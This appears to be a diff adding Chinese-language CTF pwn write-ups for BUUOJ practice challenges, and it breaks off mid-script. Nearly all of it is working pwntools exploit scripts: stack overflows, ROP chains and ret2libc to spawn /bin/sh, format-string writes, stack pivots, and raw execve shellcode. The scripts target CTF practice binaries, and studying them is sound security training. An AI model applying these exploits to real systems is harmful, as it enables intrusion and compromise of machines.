+puts_got = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
+base = puts_got - libc.symbols[&#39;puts&#39;]
+one = base+0x4f322
+payload = &#39;a&#39;*88+p64(one)
+p.recvuntil(&#39;choice&#39;)
+p.sendline(&#39;1&#39;)
+p.recvuntil(&#39;encrypted&#39;)
+co = cropy(payload)
+p.sendline(co)
+p.interactive()
+</code></pre>
+<p>python 异或一下,存在栈溢出泄露基址,然后返回 main 再来一遍,之后 one_gadget 直接出.我是傻逼,解这题 2&#x2F;3 时间都在看自己的异或函数哪有问题,最后发现自己想多了.啊啊啊啊啊啊,真得 C 语言怎么写 python 就怎么写</p>
+<p>##get_started_3dsctf_2016</p>
+<pre><code>from pwn import *
+from struct import pack
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context.log_level = &#39;debug&#39;
+#io = process(&quot;./get_started_3dsctf_2016&quot;)
+io = remote(&#39;node3.buuoj.cn&#39;,29153)
+p = &#39;&#39;
+p += pack(&#39;&lt;I&#39;, 0x0806fc30) # pop edx ; pop ecx ; pop ebx ; ret  
+p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0x080b91e6) # pop eax ; ret
+p += &#39;/bin&#39;
+p += pack(&#39;&lt;I&#39;, 0x080557ab) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806fc30) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0x080b91e6) # pop eax ; ret
+p += &#39;//sh&#39;
+p += pack(&#39;&lt;I&#39;, 0x080557ab) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806fc30) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0x08049463) # xor eax, eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x080557ab) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x080481ad) # pop ebx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0x0806fc31) # pop ecx ; pop ebx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8
+p += pack(&#39;&lt;I&#39;, 0x080eb060) # padding without overwrite ebx
+p += pack(&#39;&lt;I&#39;, 0x0806fc30) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data + 8
+p += pack(&#39;&lt;I&#39;, 0x080b91e6) # pop eax; ret
+p += pack(&#39;&lt;I&#39;, 11) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806d7e5) # int 0x80
+sleep(0.1)
+#gdb.attach(io,&#39;b*0x08048A3B&#39;)
+io.sendline(&#39;a&#39;*56+p)
+io.interactive()
+</code></pre>
+<p>静态编译的直接找 rop 就行,但是这里有 \x0a 截断,在 p 字符串输入的时候注意一下.还有一种直接用 mprotect ,也行</p>
+<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><pre><code>from pwn import *
+#p = process(&#39;./pwn&#39;)
+context.log_level = &#39;debug&#39;
+#p=remote(&#39;node3.buuoj.cn&#39;,27693)
+payload = fmtstr_payload(10, &#123;0x0804C044:123&#125;)
+p.send(payload)
+sleep(0.1)
+p.sendline(&#39;123&#39;)
+p.interactive()
+</code></pre>
+<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context.log_level = &#39;debug&#39;
+#io = process(&quot;./r2t3&quot;)
+io = remote(&#39;node3.buuoj.cn&#39;,29959)
+elf = ELF(&quot;r2t3&quot;)
+#libc=elf.libc
+libc=ELF(&quot;libc-2.29.so&quot;)
+got = elf.got[&quot;puts&quot;]
+plt = elf.plt[&#39;puts&#39;]
+io.recvuntil(&#39;name&#39;)
+#gdb.attach(io,&#39;b*0x08048A3B&#39;)
+payload = &#39;a&#39;*21+p32(plt)+p32(0x8048490)+p32(got)
+payload = payload.ljust(260,&#39;a&#39;)
+
+io.send(payload)
+real = u32(io.recvuntil(&#39;\xf7&#39;)[-4:])
+libc_base = real - libc.symbols[&quot;puts&quot;]
+print hex(libc_base)
+system = libc.symbols[&quot;system&quot;] + libc_base
+sh = libc_base+libc.search(&quot;/bin/sh&quot;).next()
+payload = &#39;a&#39;*21+p32(system)+p32(0xdeadbeef)+p32(sh)
+payload = payload.ljust(516,&#39;a&#39;)
+#gdb.attach(io,&#39;b*0x80485DE&#39;)
+io.send(payload)
+io.interactive()
+</code></pre>
+<p>什么??有后门??有意思吗</p>
+<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+def debug(addr,PIE=True):
+	if PIE:
+		text_base = int(os.popen(&quot;pmap &#123;&#125;| awk &#39;&#123;&#123;print $1&#125;&#125;&#39;&quot;.format(p.pid)).readlines()[1], 16)
+		gdb.attach(p,&#39;b *&#123;&#125;&#39;.format(hex(text_base+addr)))
+	else:
+		gdb.attach(p,&quot;b *&#123;&#125;&quot;.format(hex(addr)))
+context.log_level = &#39;debug&#39;
+#p = process(&quot;./ciscn_2019_n_8&quot;)
+p = remote(&#39;node3.buuoj.cn&#39;,26250)
+elf = ELF(&quot;ciscn_2019_n_8&quot;)
+libc=elf.libc
+p.recvuntil(&#39;name?&#39;)
+#debug(0x000012DC)
+p.sendline(&#39;a&#39;*13*4+&#39;\x11&#39;)
+p.interactive()
+</code></pre>
+<p>我是傻逼,这题逻辑看错了,以为怎么这么难…这种题属实没意思</p>
+<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><pre><code>from pwn import *
+from struct import pack
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+io = remote(&#39;node3.buuoj.cn&#39;,29951)
+#io=process(&#39;./not_the_same_3dsctf_2016&#39;)
+# Padding goes here
+p = &#39;&#39;
+
+p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
+p += &#39;/bin&#39;
+p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4
+p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
+p += &#39;//sh&#39;
+p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0) # @ .data 
+p += pack(&#39;&lt;I&#39;, 0x0806fcf1) # pop ecx ; pop ebx ; ret
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0x080eb060)
+p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
+p += pack(&#39;&lt;I&#39;, 0xb)
+p += pack(&#39;&lt;I&#39;, 0x0806d8a5) # int 0x80
+#gdb.attach(io,&#39;b*0x80489FB&#39;)
+io.sendline(&#39;1&#39;*(0x2d)+p)
+io.interactive()
+</code></pre>
+<p>加上之前欠的 mprotect 吧</p>
+<pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+io = remote(&#39;node3.buuoj.cn&#39;,28199)
+#io=process(&#39;./not_the_same_3dsctf_2016&#39;)
+# Padding goes here
+elf = ELF(&#39;not_the_same_3dsctf_2016&#39;)
+p3_ret = 0x0806fcf0
+#0x0806fcf0 : pop edx ; pop ecx ; pop ebx ; ret
+payload = p32(0x0806ED40)+p32(p3_ret)+p32(0x080EC000)+p32(1000)+p32(7)+p32(0x0806E200)+p32(0x080EC000)+p32(0)+p32(0x080EC000)+p32(50)
+io.sendline(&#39;1&#39;*(0x2d)+payload)
+io.send(&#39;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&#39;)
+io.interactive()
+</code></pre>
+<p>另外本题还有个后门函数,那个 wp 就不写了</p>
+<h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./patched&#39;)
+p=remote(&#39;node3.buuoj.cn&#39;,25577)
+elf = ELF(&#39;./patched&#39;)
+#libc = elf.libc
+payload =&#39;a&#39;*24 +p64(0x400683)+p64(0x601048)+p64(0x4005E3)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>拿 shell 后, flag 呢(美人鱼邓超状 : 头呢)??</p>
+<h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p=remote(&#39;node3.buuoj.cn&#39;,28535)
+payload =&#39;a&#39;*136 +p64(0x400596)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./one_gadget&#39;)
+p=remote(&#39;node3.buuoj.cn&#39;,28330)
+elf = ELF(&#39;./one_gadget&#39;)
+#libc = elf.libc
+libc=ELF(&#39;libc-2.29.so&#39;)
+context.log_level = &#39;debug&#39;
+p.recvuntil(&#39;u:0x&#39;)
+printf = int(p.recvuntil(&#39;\n&#39;)[:-1],16)
+print printf
+libc_base = printf - libc.symbols[&#39;printf&#39;]
+print hex(libc_base)
+one = libc_base+0x106ef8
+print one
+p.sendline(str(one))
+p.interactive()
+</code></pre>
+<p>没啥说的, one_gadget 解决</p>
+<h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p=remote(&#39;node3.buuoj.cn&#39;,29291)
+payload =&#39;a&#39;*140 +p32(0x804845C)+p32(0x0804A024)
+#payload =&#39;a&#39;*140 +p32(0x8048320)+p32(0)+p32(0x0804A024)
+#.plt:08048320 _system         proc near
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>在这里记录一下一个我之前一直没注意的知识点,事实上在这里两个 payload 都能用,在 plt 中才是真正满足中间夹杂返回地址的情况,如果把 ret 变成函数中的地址直接往栈里写就对了</p>
+<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./babyrop2&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,25183)
+elf = ELF(&#39;./babyrop2&#39;)
+#libc = elf.libc
+libc = ELF(&#39;libc.so.6&#39;)
+got = elf.got[&quot;read&quot;]
+plt = elf.plt[&#39;printf&#39;]
+format_s = 0x0400770
+payload =&#39;a&#39;*40 +p64(0x400733)+p64(format_s)+p64(0x400731)+p64(got)+p64(0)+p64(plt)+p64(0x400636)
+#0x0000000000400731 : pop rsi ; pop r15 ; ret
+p.recvuntil(&#39;name?&#39;)
+
+p.sendline(payload)
+printf = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
+libc_base = printf - libc.symbols[&#39;read&#39;]
+print hex(libc_base)
+system = libc.symbols[&quot;system&quot;] + libc_base
+sh = libc_base+libc.search(&quot;/bin/sh&quot;).next()
+one = libc_base+0x4526a
+payload =&#39;a&#39;*40 +p64(one)+p64(0)*8
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>在这有个问题, 我想把 printf 地址用自己 printf 出来失败了,但是 read 是好使的???</p>
+<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./ciscn_s_3&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,26843)
+elf = ELF(&#39;./ciscn_s_3&#39;)
+libc = elf.libc
+#libc = ELF(&#39;libc.so.6&#39;)
+payload = &#39;a&#39;*16+p64(0x40059B)+p64(0)*5+p64(0x40059B)+p64(0)*5+p64(0x40059B)+p64(0)*5+p64(0x400503)+p64(0x4004F1)
+&#39;&#39;&#39;
+.text:00000000004004EB                 pop     rbp
+.text:00000000004004EC                 retn
+&#39;&#39;&#39;
+#gdb.attach(p,&#39;b*0x40059B&#39;)
+p.sendline(payload)
+off = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
+base = off-0x401733
+one = base+0x4f322
+payload = &#39;a&#39;*16+p64(one)+p64(0)*10
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>这种基本不限制输入的 one_gadget 通杀</p>
+<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./ciscn_2019_ne_5&#39;)
+p=remote(&#39;node3.buuoj.cn&#39;,28485)
+context.log_level = &#39;debug&#39;
+elf = ELF(&#39;./ciscn_2019_ne_5&#39;)
+#libc = elf.libc
+libc = ELF(&#39;./libc-2.27.so&#39;)
+got = elf.got[&quot;printf&quot;]
+print hex(got)
+plt = elf.plt[&#39;puts&#39;]
+print hex(plt)
+payload =&#39;2&#39;*76 +p32(plt)+p32(0x8048722)+p32(got)
+p.sendlineafter(&#39;password&#39;,&#39;administrator&#39;)
+p.sendlineafter(&#39;:&#39;,&#39;1&#39;)
+p.sendlineafter(&#39;info:&#39;,payload)
+p.sendlineafter(&#39;:&#39;,&#39;4&#39;)
+real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
+libc_base = real - libc.symbols[&quot;printf&quot;]
+print hex(libc_base)
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+print hex(sh)
+payload = &#39;2&#39;*76 +p32(0x080486B9)+p32(sh)
+p.sendline(&#39;administrator&#39;)
+p.sendlineafter(&#39;:&#39;,&#39;1&#39;)
+p.sendlineafter(&#39;info:&#39;,payload)
+print hex(libc_base)
+print hex(sh)
+p.sendlineafter(&#39;:&#39;,&#39;4&#39;)
+p.interactive()
+</code></pre>
+<p>太尴尬了,我把 64 位 so 下载下来测偏移测了半天…然后在无聊在网上看 wp 找优化的时候第一次知道这种骚操作,根据函数名有 sh 来 getshell ,太秒了</p>
+<pre><code>from pwn import *
+r=remote(&#39;node3.buuoj.cn&#39;,25488)
+e=ELF(&#39;ciscn_2019_ne_5&#39;)
+sys_plt=e.plt[&#39;system&#39;]
+sh_addr=0x80482ea
+r.recvuntil(&#39;Please input admin password:&#39;)
+r.sendline(&#39;administrator&#39;)
+r.recvuntil(&#39;0.Exit\n:&#39;)
+r.sendline(&#39;1&#39;)
+payload=&#39;a&#39;*0x4c+p32(sys_plt)+&#39;aaaa&#39;+p32(sh_addr)
+r.recvuntil(&#39;Please input new log info:&#39;)
+r.sendline(payload)
+r.recvuntil(&#39;0.Exit\n:&#39;)
+r.sendline(&#39;4&#39;)
+r.interactive()
+&#39;&#39;&#39;
+LOAD:080482E6 byte_80482E6    db 66h                  ; DATA XREF: LOAD:0804820C↑o
+LOAD:080482E7                 db  66h ; f
+LOAD:080482E8                 db  6Ch ; l
+LOAD:080482E9                 db  75h ; u
+LOAD:080482EA                 db  73h ; s
+LOAD:080482EB                 db  68h ; h
+LOAD:080482EC                 db    0
+&#39;&#39;&#39;
+</code></pre>
+<h2 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h2><pre><code>from pwn import*
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./pwn2_sctf_2016&#39;)
+elf=ELF(&#39;./pwn2_sctf_2016&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,28578)
+#libc = elf.libc
+libc = ELF(&#39;libc-2.23.so&#39;)
+got=elf.got[&#39;atoi&#39;]
+plt=elf.plt[&#39;printf&#39;]
+p.sendlineafter(&#39;read?&#39;,&#39;-1&#39;)
+#gdb.attach(p,&#39;b*0x80485A2&#39;)
+#p.sendlineafter(&#39;data&#39;,&#39;a&#39;*48+p32(0x804852F)*3)
+p.sendlineafter(&#39;data&#39;,&#39;a&#39;*48+p32(plt)+p32(0x804852F)+p32(0x80486F8)+p32(got))
+real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
+libc_base = real - libc.symbols[&quot;atoi&quot;]
+print hex(libc_base)
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+print hex(sh)
+sys = libc_base + libc.symbols[&quot;system&quot;]
+one = libc_base+0x3a80c
+p.sendlineafter(&#39;read?&#39;,&#39;-1&#39;)
+
+p.sendlineafter(&#39;data&#39;,&#39;a&#39;*48+p32(sys)+p32(sh)*2)
+p.interactive()
+</code></pre>
+<p>这题套路性太强了,一看<code>int __cdecl get_n(int a1, unsigned int a2)</code>就知道老江湖了</p>
+<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><pre><code>from pwn import*
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+elf=ELF(&#39;./ez_pz_hackover_2016&#39;)
+context.log_level = &#39;debug&#39;
+#p = process(&#39;./ez_pz_hackover_2016&#39;)
+p=remote(&#39;node3.buuoj.cn&#39;,29043)
+libc = elf.libc
+#libc = ELF(&#39;libc-2.23.so&#39;)
+p.recvuntil(&#39;0x&#39;)
+recv = int(p.recvuntil(&#39;\n&#39;)[:-1],16)
+#gdb.attach(p,&#39;b*0x80485F8&#39;)
+shellcode = &quot;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&quot;
+p.sendline(&#39;crashme\x00&#39;+&#39;a&#39;*14+p32(recv-0x1c)*2+shellcode)
+p.interactive()
+</code></pre>
+<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><pre><code>from pwn import*
+#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+elf=ELF(&#39;./spwn&#39;)
+context.log_level = &#39;debug&#39;
+#p = process(&#39;./spwn&#39;)
+p=remote(&#39;node3.buuoj.cn&#39;,26668)
+#libc = elf.libc
+libc=ELF(&#39;libc-2.23.so&#39;)
+got=elf.got[&#39;write&#39;]
+plt=elf.plt[&#39;write&#39;]
+payload = &#39;c&#39;*4+p32(plt)+p32(0x08048513)+p32(1)+p32(got)+p32(4)
+p.sendafter(&#39;Ctfer&#39;,payload)
+p.sendafter(&#39;say&#39;,&#39;a&#39;*24+p32(0x804A300)+p32(0x8048511))
+real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
+libc_base = real - libc.symbols[&quot;write&quot;]
+print hex(libc_base)
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+print hex(sh)
+sys = libc_base+libc.symbols[&quot;system&quot;]
+p.recvuntil(&#39;name&#39;)
+p.send(p32(sys)+p32(0)+p32(sh))
+#300
+one = libc_base+0x5f066
+leave = 0x8048511
+p.recvuntil(&#39;say?&#39;)
+
+p.send(&#39;a&#39;*24+p32(0x804a300-4)+p32(leave))
+#p.sendline(&#39;a&#39;*32)
+p.interactive()
+</code></pre>
+<p>这题说来惭愧,看名字 spwn 我以为是 srop ,吓得战战兢兢的做,结果就是个栈迁移,哎,太怂了~~~</p>
+<h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><pre><code>from pwn import*
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+elf=ELF(&#39;./bjdctf_2020_babystack&#39;)
+context.log_level = &#39;debug&#39;
+#p = process(&#39;./bjdctf_2020_babystack&#39;)
+p=remote(&#39;node3.buuoj.cn&#39;,28764)
+libc = elf.libc
+#libc = ELF(&#39;libc-2.23.so&#39;)
+p.sendlineafter(&#39;length&#39;,&#39;100&#39;)
+#gdb.attach(p,&#39;b*0x4006E6&#39;)
+p.sendlineafter(&#39;name?&#39;,&#39;a&#39;*24+p64(0x04006E6))
+p.interactive()
+</code></pre>
+<hr>
+<p>4.10 前劳动成果</p>
+<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><pre><code>from pwn import *
+#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context.log_level = &#39;debug&#39;
+#p = process(&#39;./ciscn_2019_es_2&#39;)
+p = remote(&quot;node3.buuoj.cn&quot;,28704)
+elf = ELF(&#39;./ciscn_2019_es_2&#39;)
+libc=elf.libc
+pay = &#39;a&#39;*(32)
+p.send(pay)
+leak = u32(p.recvuntil(&#39;\xff&#39;)[-4:])
+leak = leak-228-4
+leave = 0x8048562
+#gdb.attach(p,&#39;b*0x080485FE&#39;)
+payload = p32(0x8048559)+p32(leak+12)+&#39;/bin/sh\x00&#39;+&#39;a&#39;*(40-12-4)+p32(leak)+p32(leave)
+p.send(payload)
+p.interactive()
+</code></pre>
+<p>第一次泄露栈地址,之后一个栈迁移</p>
+<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><pre><code>from pwn import *
+context.log_level = &#39;debug&#39;
+context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,word_size=&#39;64&#39;)
+p = process(&#39;./2018_rop&#39;)
+#p = remote(&quot;node3.buuoj.cn&quot;,28557)
+elf = ELF(&#39;./2018_rop&#39;)
+libc=elf.libc
+#libc = ELF(&#39;libc-2.27.so&#39;)
+got=elf.got[&#39;getegid&#39;]
+plt=elf.plt[&#39;write&#39;]
+pay = &#39;c&#39;*140+p32(plt)+p32(0x08048474)+p32(1)+p32(got)+p32(4)
+p.sendline(pay)
+real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
+libc_base = real - libc.symbols[&quot;getegid&quot;]
+print hex(libc_base)
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+print hex(sh)
+sys = libc_base+libc.symbols[&quot;system&quot;]
+pay = &#39;c&#39;*140+p32(sys)+p32(0)+p32(sh)
+p.sendline(pay)
+p.interactive()
+</code></pre>
+<h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><pre><code>from pwn import *
+context.log_level = &#39;debug&#39;
+context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,word_size=&#39;64&#39;)
+#p = process(&#39;./level3&#39;)
+p = remote(&quot;node3.buuoj.cn&quot;,25480)
+elf = ELF(&#39;./level3&#39;)
+#libc=elf.libc
+libc = ELF(&#39;libc-2.23.so&#39;)
+got=elf.got[&#39;write&#39;]
+plt=elf.plt[&#39;write&#39;]
+pay = &#39;c&#39;*140+p32(plt)+p32(0x804844B)+p32(1)+p32(got)+p32(4)
+p.recvuntil(&#39;Input:&#39;)
+p.sendline(pay)
+real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
+libc_base = real - libc.symbols[&quot;write&quot;]
+print hex(libc_base)
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+print hex(sh)
+sys = libc_base+libc.symbols[&quot;system&quot;]
+pay = &#39;c&#39;*140+p32(sys)+p32(0)+p32(sh)
+p.sendline(pay)
+p.interactive()
+</code></pre>
+<h2 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd]r2t4"></a>[BJDCTF 2nd]r2t4</h2><pre><code>from pwn import *
+context.log_level = &#39;debug&#39;
+context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,word_size=&#39;64&#39;)
+p = process(&#39;./r2t4&#39;)
+#p = remote(&quot;node3.buuoj.cn&quot;,27166)
+elf = ELF(&#39;./r2t4&#39;)
+__stack_chk_fail = elf.got[&#39;__stack_chk_fail&#39;]
+gdb.attach(p,&#39;b*0x4006B3&#39;)
+pay = &quot;%1574c%8$hnaaaaa&quot;+ p64(__stack_chk_fail)+&#39;a&#39;*20
+p.sendline(pay)
+p.interactive()
+</code></pre>
+<p>没啥说的,格式化字符串</p>
+<h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h2><pre><code>#coding:utf-8
+from pwn  import *
+context(log_level = &#39;debug&#39;, arch = &#39;i386&#39;, os = &#39;linux&#39;)
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p=remote(&#39;node3.buuoj.cn&#39;,26912)
+#p=process(&#39;./orw&#39;)
+
+shellcode=asm(&#39;mov eax,5;xor ecx,ecx;xor edx,edx;push ecx;push 0x67616c66;mov ebx,esp;int 0x80;mov ebx,3;mov ecx,esp;mov edx,0x50;mov eax,3;int 0x80;mov eax,4;mov ebx,1;int 0x80;&#39;)
+#open(&#39;flag&#39;,0,0) eax=5 ebx=esp ecx=0 edx=0
+#read(3,esp,0x50) eax=3 ebx=3 ecx=esp edx=0x50
+#write(1,esp,0x50)eax=4 ebx=1 
+#gdb.attach(p,&#39;b*0x804858A&#39;)
+recv = p.recvuntil(&#39;:&#39;)
+p.sendline(shellcode)
+flag = p.recv(100)
+print flag
+</code></pre>
+<p>这个不能太依赖 pwntools 自带的 syscall ,还是自己写最稳</p>
+<h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a>pwnable_start</h2><pre><code>from pwn import *
+context.log_level = &#39;debug&#39;
+#p = process(&#39;./start&#39;)
+p = remote(&quot;node3.buuoj.cn&quot;,29590)
+pay = &#39;a&#39;*0x14+p32(0x08048087)
+#gdb.attach(p,&#39;b *0x08048087&#39;)
+p.recvuntil(&#39;CTF:&#39;)
+p.send(pay)
+leak = u32(p.recv(4))
+shellcode=&#39;a&#39;*0x14+p32(leak+0x14)+&#39;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&#39;
+p.send(shellcode)
+p.interactive()
+</code></pre>
+<hr>
+<p>4.11 日前劳动成果,目前排名 143 ,分数 331 ,现在开始看看堆,全忘光了~~~</p>
+<h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><pre><code>from pwn import *
+#p = process(&#39;./fm&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,25972)
+payload = fmtstr_payload(11, &#123;0x0804A02C:4&#125;)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><p>???</p>
+<h2 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h2><pre><code>from pwn import *
+#p = process(&#39;./guestbook&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,25907)
